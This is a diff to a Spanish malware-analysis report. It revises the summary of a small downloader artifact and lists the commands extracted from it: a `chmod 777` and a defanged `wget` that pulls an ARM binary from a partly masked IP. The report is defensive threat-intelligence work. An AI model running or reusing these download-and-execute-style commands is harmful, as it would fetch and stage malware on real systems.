@@ -4,7 +4,10 @@
 
 ## 📌 Resumen
 
-Artefacto identificado como ASCII text, with CRLF line terminators de 267 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `kaizen.arm7sf_srv+-O+.k` en `hxxp://196.251.121.XXX/a3f8d2/kaizen.arm7sf_srv+-O+.k`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+Texto ASCII de 267 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `kaizen.arm7sf_srv+-O+.k` en `hxxp://196.251.121.XXX/a3f8d2/kaizen.arm7sf_srv+-O+.k`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**
+
+1. `chmod 777 .k`
+2. `wget hxxp://196.251.121.XXX/a3f8d2/kaizen.arm7sf_srv -O .k` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/196bfe338a07f1d568033efbce32a3606612ed513b1c6ec741e9cc0c3fb8621b.md](../../../../../malware-like/oraculo/downloader/196bfe338a07f1d568033efbce32a3606612ed513b1c6ec741e9cc0c3fb8621b.md)
 
 
 ## 🏷️ Clasificación
